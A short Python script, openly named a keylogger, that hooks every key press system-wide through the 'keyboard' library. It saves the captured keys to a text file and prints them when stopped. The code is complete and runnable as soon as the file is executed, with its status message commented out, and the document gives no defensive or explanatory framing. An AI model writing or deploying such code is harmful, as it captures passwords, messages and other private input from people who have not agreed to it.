import keyboard

def keylogger(output_file="logged_keystrokes.txt"):
   
    try:
        # Check if the `keyboard` library is installed
        import keyboard
    except ImportError:
        raise ImportError("The 'keyboard' library is not installed. Please install it using 'pip install keyboard'.")

    logged_keystrokes = ""

    def on_key_press(event):
     
        nonlocal logged_keystrokes

        logged_keystrokes += event.name

        return True

    keyboard.on_press(on_key_press)

    #print("Capturing keystrokes...")

    try:
        keyboard.wait()
    except KeyboardInterrupt:
        pass
    finally:

        keyboard.unhook_all()

        with open(output_file, "w") as file:
            file.write(logged_keystrokes)

    return logged_keystrokes

logged_keys = keylogger()
print(f"Logged keystrokes: {logged_keys}")
